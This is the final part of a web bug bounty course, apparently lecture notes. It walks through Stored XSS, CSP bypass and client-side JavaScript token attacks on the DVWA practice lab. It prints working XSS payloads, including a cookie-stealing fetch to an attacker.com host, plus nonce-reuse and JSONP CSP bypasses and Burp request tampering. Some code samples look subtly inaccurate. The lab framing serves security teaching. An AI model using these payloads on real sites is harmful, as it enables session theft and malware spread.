## Module 63: Stored Cross-Site Scripting (XSS)

### What is Stored XSS?

**Definition:** Stored Cross-Site Scripting is like a hacker sneaking a harmful note into a public space, like a bulletin board or comment section. Every time someone else comes by and reads it, they get tricked into something bad happening.

**Key Difference from Other XSS:**

**Reflected/DOM XSS:**

- Affects one user at a time
- Requires victim to click link
- Not stored in database
- Limited to single browser session
- Medium impact

**Stored XSS:**

- Affects ALL users who visit page
- Stored in database permanently
- No user interaction needed (sometimes)
- Persists across sessions
- HIGH impact - Most dangerous!

### How Stored XSS Works

**Attack Flow:**

```
1. Attacker posts malicious code (comment/profile)
2. Website saves to database (no sanitization)
3. Code permanently stored on server
4. ANY user visits page
5. Malicious code executes in their browser
6. All visitors get infected
```

**Real-World Locations:**

- Comment sections
- User profiles
- Forum posts
- Guestbooks
- Review systems
- Chat messages
- Bio/description fields

---

## Module 64: Stored XSS Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → Stored Cross-Site Scripting
Security Level: Low
PHPIDS: Disabled (for testing)
```

**Interface:**

```
Name: [________]
Message: [________________]
Button: Sign Guestbook
```

### Testing Normal Functionality

**Input:**

```
Name: Kratos
Message: God of War
Sign Guestbook
```

**Result:**

```
Comment appears:
Name: Kratos
Message: God of War
```

**Key Observation:** Previous comments from XSS section still visible - data persists!

### Testing HTML Injection First

**Why Test HTML First:**

- Quick validation check
- HTML injection = XSS likely possible
- Tests input sanitization

**Payload:**

```html
Name: Kratos Message:
<h1>God of War</h1>
```

**Result:**

```
"God of War" displays as large heading!
HTML injection confirmed! ✓
```

**Conclusion:** No HTML sanitization = Stored XSS vulnerable!

### Stored XSS Exploitation

**Payload 1: OnMouseOver Event**

**Input:**

```html
Name: Kratos Message: <b onmouseover="alert('hacked')">Spartan</b>
```

**How It Works:**

```html
<b>
  tag creates bold text "Spartan" onmouseover event triggers when mouse hovers alert('hacked')
  executes JavaScript</b
>
```

**Result:**

- "Spartan" appears as comment
- Mouse hover → Alert popup appears
- EVERY user who hovers sees alert
- Stored permanently in database!

**Payload 2: Auto-Redirect (More Dangerous)**

**Input:**

```html
Name: Zeus Message: <b onmouseover="window.open('https://x.com')">God</b>
```

**Result:**

- User hovers over "God"
- Automatically redirects to x.com
- Can redirect to malicious site!

**Real Attack Scenario:**

```
1. Attacker finds Stored XSS in Instagram comments
2. Posts: <b onmouseover="window.open('malware-site.com')">Cool pic!</b>
3. Anyone viewing comment gets redirected
4. Malware site downloads malware
5. ALL Instagram users viewing that post infected!
```

### Source Code Analysis

**View Source - Low:**

```php
<?php
$name = $_POST['txtName'];
$message = $_POST['mtxMessage'];

// Sanitize name
$name = stripslashes($name);
$name = mysql_real_escape_string($name);

// Sanitize message
$message = stripslashes($message);
$message = mysql_real_escape_string($message);

// Update database
$query = "INSERT INTO guestbook (name, comment) VALUES ('$name', '$message')";
mysql_query($query);
?>
```

**Analysis:**

- Uses `mysql_real_escape_string()` for SQL injection prevention
- BUT no HTML/JavaScript sanitization!
- Stores malicious code directly in database
- Renders without encoding when displayed

**Vulnerability Check:**

```
✓ SQL Injection: Protected (escaped)
✗ Stored XSS: Vulnerable (no HTML encoding)
```

---

## Module 65: Stored XSS Impact Demonstration

### Cookie Theft via Stored XSS

**Malicious Payload:**

```html
Name: Attacker Message: <b onmouseover="alert(document.cookie)">Click here!</b>
```

**What Happens:**

```
1. Payload stored in database
2. User A visits page → Cookie stolen
3. User B visits page → Cookie stolen
4. User C visits page → Cookie stolen
5. ALL visitors compromised!
```

**In Reality (Sending to Attacker Server):**

```html
<b onmouseover="fetch('https://attacker.com/steal?c='+document.cookie)">Win Prize!</b>
```

### Malware Distribution

**Dangerous Redirect:**

```html
<b onmouseover="window.open('https://malware-site.com/download.exe')">Free iPhone!</b>
```

**Attack Chain:**

```
User hovers → Redirects to malware site
Malware site → Auto-downloads trojan
User runs file → System compromised
Attacker gains → Full access
```

### Why Stored XSS is Most Dangerous

**Scale of Impact:**

**Reflected XSS:**

```
1 malicious link → 1 victim
Attacker must send link to each victim individually
```

**Stored XSS:**

```
1 malicious comment → UNLIMITED victims
Everyone who visits page gets infected automatically
No further action from attacker needed
```

**Real-World Damage:**

**Example: Social Media Platform**

```
Instagram post with 1 million views
Attacker posts Stored XSS in comments
1 million users potentially infected
All their cookies/sessions stolen
Mass account compromise
```

**Example: E-commerce Site**

```
Product review with XSS
Thousands of shoppers view reviews
All redirect to phishing page
Credit card details stolen
Financial losses
```

---

## Module 66: Stored XSS - Medium Security

### Testing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Navigate to: Stored XSS
```

**Test Previous Payload:**

```html
Name: Test Message:
<h1>Hello</h1>
```

**Result:** HTML tags stripped! No heading displayed

### Source Code Analysis

**View Source - Medium:**

```php
<?php
// Name input
$name = $_POST['txtName'];
$name = str_replace("<script>", "", $name);

// Message input
$message = $_POST['mtxMessage'];
$message = htmlspecialchars($message);

// Store in database
$query = "INSERT INTO guestbook VALUES ('$name', '$message')";
?>
```

**Protection Analysis:**

**Name Field:**

```php
str_replace("<script>", "", $name);
// Only removes <script> tags
// Other HTML tags allowed!
```

**Message Field:**

```php
htmlspecialchars($message);
// Converts < to &lt; > to &gt;
// Prevents HTML rendering
// Secure!
```

**Vulnerability:** Name field has weak filtering!

### Attempting Bypass

**Issue 1: Character Limit**

**Name field has max length:**

```html
<input name="txtName" maxlength="10" />
```

**Problem:** Can't fit full payload in 10 characters!

**Solution:** Bypass client-side validation with Burp Suite

### Burp Suite Bypass

**Step 1: Enable Burp**

```
FoxyProxy → Burp (Enabled)
Burp Suite → Intercept: ON
```

**Step 2: Test HTML Injection**

**Input:**

```
Name: <h1>Test</h1>
Message: Hello
```

**Intercept and Modify:**

```http
POST /vulnerabilities/xss_s/ HTTP/1.1

txtName=<h1>Test</h1>&mtxMessage=Hello&btnSign=Sign+Guestbook
```

**Forward Request**

**Result:**

```
Intercept: OFF
Check page → "Test" displays as heading! ✓
```

**Conclusion:** Client-side validation bypassed!

### Full Exploit with Burp

**Step 1: Prepare Payload**

```html
<b onmouseover="window.open('https://x.com')">Bypass</b>
```

**Step 2: Submit with Burp**

**Normal submission blocked (too long)**

**Burp Intercept:**

```http
POST /vulnerabilities/xss_s/ HTTP/1.1

txtName=<b+onmouseover="window.open('https://x.com')">Bypass</b>&mtxMessage=Test&btnSign=Sign+Guestbook
```

**Fix encoding:**

```
Replace spaces with +
Replace " with proper encoding if needed
```

**Step 3: Forward**

```
Intercept: OFF
Check page
```

**Result:**

- "Bypass" appears in guestbook
- Mouse hover → Redirects to x.com
- Medium security bypassed! ✓

### Why Medium Security Failed

**Weak Points:**

1. Only blocks `<script>` tags
2. Allows other HTML tags
3. Client-side validation easily bypassed
4. No comprehensive input sanitization

**Lesson:** Blacklist filtering is insufficient!

---

## Module 67: Content Security Policy (CSP) Bypass

### What is CSP?

**Definition:** Content Security Policy (CSP) is a built-in browser technology which helps protect from attacks such as Cross-Site Scripting. It lists and describes paths and resources from which the browser can safely load resources.

**How CSP Works:**

- Implemented via response headers
- Implemented via HTML meta elements
- Specifies allowed script sources
- Blocks untrusted scripts
- Prevents XSS exploitation

**CSP Example:**

```http
Content-Security-Policy: script-src 'self' https://trusted.com
```

**What This Means:**

- Only allow scripts from same origin ('self')
- Only allow scripts from trusted.com
- Block all other external scripts
- Prevents XSS payload execution

### CSP Bypass Attack

**Definition:** A CSP bypass attack occurs when an attacker is able to include external resources and scripts due to some misconfiguration in the CSP headers, which might result in XSS and other attacks.

**Why CSP Can Be Bypassed:**

- Misconfigured policies
- Overly permissive rules
- Trusted domains compromised
- JSONP endpoints exploitable

---

## Module 68: CSP Bypass Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → CSP Bypass
Security Level: Low
```

**Interface:**

```
Message: "You can include scripts from external resources.
         Examine the Content Security Policy and enter
         a URL to include here."

Input: [_______________________________]
Button: Include
```

### Understanding the Challenge

**Goal:** Include external script that executes

**Allowed by CSP:** External resources from specific domains

### Setting Up External Script

**Step 1: Create Malicious Script**

```bash
# In terminal
mousepad script.js
```

**Script Content:**

```javascript
alert('hacked')
```

**Save as:** `script.js`

**Step 2: Copy to Docker Container**

**Check Container ID:**

```bash
sudo docker ps
```

**Copy Script:**

```bash
sudo docker cp script.js [CONTAINER_ID]:/var/www/html/dvwa/
```

**Verify:**

```bash
sudo docker exec -it [CONTAINER_ID] bash
cd /var/www/html/dvwa
ls
# script.js should be visible
```

### Analyzing CSP Headers

**View Source:**

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com https://code.jquery.com https://www.google-analytics.com;";
?>
```

**Allowed Sources:**

- `'self'` - Same origin (localhost)
- `https://pastebin.com`
- `https://code.jquery.com`
- `https://www.google-analytics.com`

### Exploitation

**Attempt 1: Pastebin (Blocked)**

**Why:** Pastebin has its own security that prevents this

**Attempt 2: Self (localhost)**

**Payload:**

```
http://localhost/dvwa/script.js
```

**Input in field:**

```
http://localhost/dvwa/script.js
```

**Click: Include**

**Result:**

```
Alert popup: "hacked"
CSP bypassed! ✓
```

**Why It Worked:**

- CSP allows 'self' (same origin)
- script.js hosted on same server
- Executed without restriction

---

## Module 69: CSP Bypass - Medium Security

### Analyzing Medium CSP

**Change Security Level:**

```
DVWA Security → Medium
Navigate to: CSP Bypass
```

**View Source - Medium:**

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw';";
?>
```

**New Protection:**

- Removed external domains
- Added `'unsafe-inline'`
- Added nonce value
- More restrictive!

### Understanding Nonce

**What is Nonce?**

- Number used ONCE
- Random token for each request
- Script must include correct nonce
- Prevents unauthorized scripts

**Nonce Value:**

```
TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw
```

**Decode in CyberChef:**

```
Recipe: From Base64
Input: TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw
Output: NeverGoingToGiveYouUp
```

**Fun Fact:** Rick Roll reference! 😄

### Finding Nonce in Response

**Use Burp Suite:**

**Step 1: Intercept Request**

```
Burp → Intercept: ON
Include any URL
```

**Step 2: Check Response Headers**

```http
HTTP/1.1 200 OK
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw';
```

**Nonce Found:** `TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw`

### Exploitation with Nonce

**Payload Structure:**

```html
<script nonce="NONCE_VALUE" src="SCRIPT_URL"></script>
```

**Complete Payload:**

```html
<script nonce="TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw" src="http://localhost/dvwa/script.js"></script>
```

**Using Burp Repeater:**

**Step 1: Craft Request**

```http
POST /vulnerabilities/csp/ HTTP/1.1

include=<script+nonce="TmV2ZXJHb2luZ1RvR2l2ZVlvdVVw"+src="http://localhost/dvwa/script.js"></script>
```

**Step 2: Send**

**Result:**

```
Alert popup: "hacked"
CSP with nonce bypassed! ✓
```

### Why This Worked

**Nonce Validation:**

```
1. Browser checks script nonce
2. Compares with CSP header nonce
3. Match → Allow execution
4. No match → Block
```

**Our Attack:**

1. Found nonce in response header
2. Included nonce in script tag
3. Nonce matched
4. Script executed successfully

---

## CSP Bypass Summary

### Key Concepts

**What We Learned:**
✓ What CSP is and how it works
✓ CSP header structure
✓ Allowed sources configuration
✓ Nonce-based protection
✓ How to bypass misconfigured CSP

### Common CSP Misconfigurations

| Misconfiguration        | Exploit Method           |
| ----------------------- | ------------------------ |
| 'unsafe-inline' allowed | Direct inline scripts    |
| 'unsafe-eval' allowed   | eval() exploitation      |
| Wildcard domains        | Subdomain takeover       |
| JSONP endpoints         | Callback parameter abuse |
| Predictable nonce       | Reuse nonce value        |
| 'self' too permissive   | Upload malicious file    |

### Real-World CSP Bypass Techniques

**1. JSONP Endpoints:**

```html
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>
```

**2. Angular Template Injection:**

```html
{{constructor.constructor('alert(1)')()}}
```

**3. Subdomain Takeover:**

```
CSP allows: *.example.com
Find unclaimed: old.example.com
Host malicious script there
```

---

## Module 70: JavaScript-Based Attacks

### What are JavaScript-Based Attacks?

**Definition:** JavaScript attacks consist of a series of client-side attacks that are possible with the abuse of the client-side JavaScript used by the application.

**How They Happen:**

- Developer implements JavaScript for client-side security
- Attacker analyzes JavaScript code
- Finds implementation flaws
- Bypasses security restrictions
- Performs malicious actions

**Key Point:** Not a traditional vulnerability like XSS/SQLi - it's security bypass through code analysis!

---

## Module 71: JavaScript Attacks Practical (DVWA)

### Initial Setup

**Navigate to:**

```
DVWA → JavaScript Attacks
Security Level: Low
```

**Challenge:**

```
Message: "Submit the word 'success' to win"
Input: [_________________]
Button: Submit
```

### Testing Normal Input

**Input: success**

**Result:**

```
Invalid token
```

**Observation:** Requires valid token to submit!

### Analyzing JavaScript Code

**View Source:**

```html
<script src="vulnerabilities/javascript/source/low.js"></script>
```

**JavaScript Content:**

```javascript
function do_something(e) {
  for (var t = '', n = e.length - 1; n >= 0; n--) t += e[n]
  return t
}

function token_part_1(e, t) {
  document.getElementById('token').value = MD5(ROT13(e))
}

function token_part_2(e, t) {
  document.getElementById('token').value = MD5(ROT13(e))
}

function token_part_3(e, t) {
  document.getElementById('token').value = MD5(ROT13(e))
}
```

**Analysis:**

1. Takes input phrase
2. Applies ROT13 encoding
3. Generates MD5 hash
4. Uses as token

### Breaking Down the Algorithm

**Step 1: ROT13 Encoding**

**What is ROT13?**

- Caesar cipher substitution
- Rotates alphabet 13 places
- A → N, B → O, C → P, etc.

**Example:**

```
Input: success
ROT13: fhpprff
```

**Step 2: MD5 Hashing**

**Generate MD5:**

```
Input: fhpprff
MD5: [generates 32-character hash]
```

### Using CyberChef

**Step 1: Apply ROT13**

```
Input: success
Recipe: ROT13
Output: fhpprff
```

**Step 2: Generate MD5**

```
Use online MD5 generator
Input: fhpprff
Output: 38581812b435834ebf84ebcc2c6424d6
```

### Exploitation with Burp Suite

**Step 1: Enable Burp**

```
FoxyProxy → Burp
Intercept: ON
```

**Step 2: Submit Request**

```
Input: success
Submit
```

**Step 3: Modify Token**

**Intercepted Request:**

```http
POST /vulnerabilities/javascript/ HTTP/1.1

phrase=success&token=WRONG_TOKEN&send=Submit
```

**Replace with Correct Token:**

```http
phrase=success&token=38581812b435834ebf84ebcc2c6424d6&send=Submit
```

**Step 4: Forward**

```
Intercept: OFF
```

**Result:**

```
Well done!
Challenge completed! ✓
```

---

## Module 72: JavaScript Attacks - Medium Security

### Analyzing Medium Security

**Change Security Level:**

```
DVWA Security → Medium
Navigate to: JavaScript Attacks
```

**View Source:**

```html
<script src="vulnerabilities/javascript/source/medium.js"></script>
```

**JavaScript Content (Obfuscated):**

```javascript
function do_something(e) {
  for (var t = '', n = e.length - 1; n >= 0; n--) t += e[n]
  return t
}

function do_else(e) {
  document.getElementById('token').value = do_something(e + document.getElementById('phrase').value)
}
```

**Analysis:**

- More complex obfuscation
- Reverses the input string
- Concatenates with phrase
- Sets as token

### Breaking the Algorithm

**Step 1: Understand do_something()**

**Function:**

```javascript
for (var n = e.length - 1; n >= 0; n--) t += e[n]
```

**What it does:** Reverses the string!

**Example:**

```
Input: "ChangeMe"
Output: "eMegnahC"
```

**Step 2: Apply to "success"**

**Reverse "success":**

```
s-u-c-c-e-s-s
Reversed: s-s-e-c-c-u-s
Result: sseccus
```

### Exploitation

**Step 1: Calculate Token**

```
Input phrase: success
Reversed: sseccus
Token: sseccus
```

**Step 2: Submit with Burp**

**Intercept:**

```http
POST /vulnerabilities/javascript/ HTTP/1.1

phrase=success&token=WRONG&send=Submit
```

**Modify:**

```http
phrase=success&token=sseccus&send=Submit
```

**Forward**

**Result:**

```
Well done!
Medium security bypassed! ✓
```

---

## JavaScript Attacks Summary

### Key Concepts

**What We Learned:**
✓ Client-side security bypass
✓ JavaScript code analysis
✓ Algorithm reverse engineering
✓ ROT13 encoding
✓ MD5 hashing
✓ String manipulation techniques

### Common JavaScript Security Patterns

| Pattern         | Purpose           | Bypass Method         |
| --------------- | ----------------- | --------------------- |
| ROT13           | Obfuscation       | Decode with CyberChef |
| Base64          | Encoding          | Decode online         |
| MD5             | Token generation  | Replicate algorithm   |
| String reverse  | Obfuscation       | Reverse again         |
| Math operations | Token calculation | Calculate manually    |

### Real-World Applications

**Where JavaScript Security Fails:**

- Client-side validation
- Hidden form fields
- Token generation
- License verification
- Payment validation

**Important:** Never trust client-side security!

---

## Course Completion

### Congratulations! 🎉

**You have completed the Ultimate Bug Bounty Course!**

**What You've Learned:**

**Reconnaissance:**
✓ Subdomain enumeration
✓ Port scanning
✓ Directory bruteforcing
✓ Technology detection

**Common Vulnerabilities:**
✓ Brute Force Attacks
✓ Command Injection
✓ CSRF (Cross-Site Request Forgery)
✓ File Inclusion (LFI/RFI)
✓ File Upload Vulnerabilities
✓ SQL Injection (Error & Blind)
✓ Weak Session IDs

**XSS Variants:**
✓ DOM-Based XSS
✓ Reflected XSS
✓ Stored XSS

**Advanced Topics:**
✓ CSP Bypass
✓ JavaScript-Based Attacks

### Your Journey: Zero to Hero

**You are now equipped to:**

- Start bug bounty hunting
- Identify web vulnerabilities
- Exploit security flaws ethically
- Write professional reports
- Earn bounties from platforms

### Next Steps

**1. Practice More:**

- Complete all DVWA security levels
- Try other platforms: bWAPP, WebGoat
- Participate in CTFs

**2. Join Bug Bounty Platforms:**

- HackerOne
- Bugcrowd
- Intigriti
- Start with VDP programs

**3. Continue Learning:**

- Advanced web hacking
- API security
- Mobile application testing
- Cloud security

### Resources Provided

**DVWA Writeups:**

- Low Security solutions
- Medium Security solutions
- High Security solutions
- All vulnerabilities covered

**Setup Guides:**

- Docker container setup
- Kali Linux installation
- Tool configurations

**Course Notes:**

- Complete slides
- All commands documented
- Payload references
- Available on Telegram channel

### Additional Resources

**Subscribe to Newsletter:**

- GodAccess.io
- Penetration testing case studies
- Red teaming techniques
- Real-world attack analyses
- Email newsletter signup

### Final Words

**Thank you for your time and dedication!**

From zero knowledge to bug bounty hunter level - you've made incredible progress. The skills you've learned here are the foundation for a successful career in cybersecurity.

**Remember:**

- Always hunt ethically
- Stay within scope
- Continuous learning is key
- Practice makes perfect
- Help the community

**Keep hacking (ethically)!**

See you in the next video!
Until then, goodbye! 👋

---

**Course Status:** ✅ COMPLETE
**Achievement Unlocked:** Bug Bounty Hunter 🏆
**Next Level:** Real-World Bug Hunting

---

## Complete Vulnerability List

### Vulnerabilities Covered

| #   | Vulnerability        | Severity | Difficulty |
| --- | -------------------- | -------- | ---------- |
| 1   | Brute Force          | High     | Easy       |
| 2   | Command Injection    | Critical | Medium     |
| 3   | CSRF                 | High     | Easy       |
| 4   | File Inclusion (LFI) | High     | Medium     |
| 5   | File Inclusion (RFI) | Critical | Medium     |
| 6   | File Upload          | Critical | Easy       |
| 7   | SQL Injection        | Critical | Medium     |
| 8   | Blind SQL Injection  | Critical | Hard       |
| 9   | Weak Session IDs     | High     | Medium     |
| 10  | DOM XSS              | Medium   | Medium     |
| 11  | Reflected XSS        | Medium   | Easy       |
| 12  | Stored XSS           | High     | Easy       |
| 13  | CSP Bypass           | Medium   | Hard       |
| 14  | JavaScript Attacks   | Low      | Medium     |

### Tools Used

**Reconnaissance:**

- Subfinder
- Amass
- DNSx
- HTTPx
- Nmap
- Naabu
- Feroxbuster
- Nuclei
- Katana
- Wafw00f

**Exploitation:**

- Burp Suite
- Hydra
- SQLMap
- Commix
- CyberChef
- Reverse Shell Generators

**Setup:**

- Docker
- Kali Linux
- DVWA

---

## Final Notes

**Best Practices:**

- Always get permission
- Stay within scope
- Report responsibly
- Document everything
- Learn continuously

**Bug Bounty Tips:**

- Start with VDP programs
- Read program policies carefully
- Quality over quantity
- Build reputation gradually
- Network with community

**Success Metrics:**

- Vulnerabilities found
- Reports submitted
- Bounties earned
- Skills improved
- Community contributions

---
